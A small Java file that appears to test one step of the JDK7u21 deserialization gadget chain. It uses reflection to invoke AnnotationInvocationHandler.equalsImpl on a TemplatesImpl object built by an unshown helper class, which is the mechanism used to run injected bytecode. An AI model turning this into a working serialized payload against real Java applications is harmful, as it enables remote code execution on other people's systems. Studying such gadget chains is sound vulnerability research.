import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class annotationInvocationHandler {
    public static void main(String[] args) throws Exception{
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object ahObject = constructor.newInstance(Templates.class, new HashMap<String, Object>());

        Method equalsImpl = aClass.getDeclaredMethod("equalsImpl", Object.class);
        equalsImpl.setAccessible(true);
        equalsImpl.invoke(ahObject, new templatesImpl().getTmpl());

        System.out.println("yes");
    }
}
